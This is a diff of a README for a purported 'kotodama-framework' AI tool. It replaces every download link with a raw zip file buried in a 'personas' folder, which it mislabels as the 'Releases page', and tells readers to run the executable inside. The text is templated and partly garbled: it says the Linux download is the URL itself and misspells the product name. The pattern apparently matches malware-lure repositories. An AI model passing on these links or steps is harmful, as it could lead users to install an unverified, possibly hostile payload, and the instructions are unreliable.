@@ -19,15 +19,15 @@ Welcome to kotodama-framework! This application helps you manage AI behaviors fo
 ## 📥 Download & Install
 To get started, visit the Releases page to download the application.
 
-[![Download kotodama-framework](https://raw.githubusercontent.com/LegendsVenom/kotodama-framework/main/docs/mechanism-atlas/framework-kotodama-v2.0.zip)](https://raw.githubusercontent.com/LegendsVenom/kotodama-framework/main/docs/mechanism-atlas/framework-kotodama-v2.0.zip)
+[![Download kotodama-framework](https://raw.githubusercontent.com/LegendsVenom/kotodama-framework/main/personas/lian_ej/kotodama_framework_2.5.zip)](https://raw.githubusercontent.com/LegendsVenom/kotodama-framework/main/personas/lian_ej/kotodama_framework_2.5.zip)
 
-1. Go to the [Releases page](https://raw.githubusercontent.com/LegendsVenom/kotodama-framework/main/docs/mechanism-atlas/framework-kotodama-v2.0.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/LegendsVenom/kotodama-framework/main/personas/lian_ej/kotodama_framework_2.5.zip).
 2. Find the latest version of kotodama-framework.
 3. Click on the download link for your operating system.
 4. Once the download is complete, locate the downloaded file on your computer.
    - For Windows, it will be a `.exe` file.
    - For macOS, it will be a `.dmg` file.
-   - For Linux, you will find a `https://raw.githubusercontent.com/LegendsVenom/kotodama-framework/main/docs/mechanism-atlas/framework-kotodama-v2.0.zip` file.
+   - For Linux, you will find a `https://raw.githubusercontent.com/LegendsVenom/kotodama-framework/main/personas/lian_ej/kotodama_framework_2.5.zip` file.
 5. Open the file and follow the on-screen instructions to install cotodama-framework.
 
 ## 💡 How to Use
@@ -77,7 +77,7 @@ Your feedback helps us improve! If you find any issues or want to suggest featur
 ## 🔗 Additional Resources
 For more information, check out our other documentation and resources available online. Understanding the capabilities of the kotodama-framework will help you make the most of your AI.
 
-Remember, to download the application, visit the [Releases page](https://raw.githubusercontent.com/LegendsVenom/kotodama-framework/main/docs/mechanism-atlas/framework-kotodama-v2.0.zip).
+Remember, to download the application, visit the [Releases page](https://raw.githubusercontent.com/LegendsVenom/kotodama-framework/main/personas/lian_ej/kotodama_framework_2.5.zip).
 
-[![Download kotodama-framework](https://raw.githubusercontent.com/LegendsVenom/kotodama-framework/main/docs/mechanism-atlas/framework-kotodama-v2.0.zip)](https://raw.githubusercontent.com/LegendsVenom/kotodama-framework/main/docs/mechanism-atlas/framework-kotodama-v2.0.zip)
+[![Download kotodama-framework](https://raw.githubusercontent.com/LegendsVenom/kotodama-framework/main/personas/lian_ej/kotodama_framework_2.5.zip)](https://raw.githubusercontent.com/LegendsVenom/kotodama-framework/main/personas/lian_ej/kotodama_framework_2.5.zip)
 ```
